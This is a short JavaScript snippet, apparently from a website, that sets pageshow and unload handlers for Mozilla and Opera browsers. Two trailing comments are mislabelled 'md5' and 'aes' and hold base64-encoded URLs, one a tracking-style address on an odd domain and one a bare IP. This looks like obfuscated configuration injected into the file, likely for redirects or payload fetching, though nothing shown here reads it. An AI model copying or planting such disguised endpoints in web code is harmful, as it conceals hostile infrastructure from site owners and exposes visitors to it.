if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9wdHlmcm9udC5nZWljdmYuY29tLz9xdWRhbz1kYmE1Y2UzZS00MzBmLWNmMWYtODQ0My05YjMzN2NiNWY3ZGI=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/